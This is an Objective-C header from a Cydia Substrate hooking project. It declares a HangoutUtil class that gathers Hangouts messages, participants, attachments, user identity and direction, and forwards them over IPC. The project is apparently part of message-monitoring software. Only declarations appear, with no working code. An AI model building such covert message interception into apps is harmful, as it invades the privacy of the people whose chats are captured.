//
//  HangoutUtil.h
//  cydiasubstrate
//
//  Created by Ophat Phuetkasickonphasutha on 3/17/14.
//  Copyright 2014 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "FxEventEnums.h"

@class FxIMEvent, FxVoIPEvent, Attachment, SharedFile2IPCSender;

@interface HangoutUtil : NSObject {
@private
    SharedFile2IPCSender	*mIMSharedFileSender;
    NSDate * mTimestamp;
}

@property (retain) SharedFile2IPCSender *mIMSharedFileSender;
@property (nonatomic, retain) NSDate * mTimestamp;

+(id) sharedHangoutUtils;
+(void) collectdata_myID:(NSString *)aMyID myName:(NSString *)aMyName myPhoto:(NSString *)aMyPhoto convID:(NSString *)aConvID convName:(NSString *)aConvName participants:(NSMutableArray *)aParticipants message:(NSString *)aMessage attachment:(NSMutableArray *)aAttachment direction:(NSString *)aDirection;
+ (NSString *) locationStringFromLocationName: (NSString *) aName locationAdress: (NSString *) aAddress;
@end
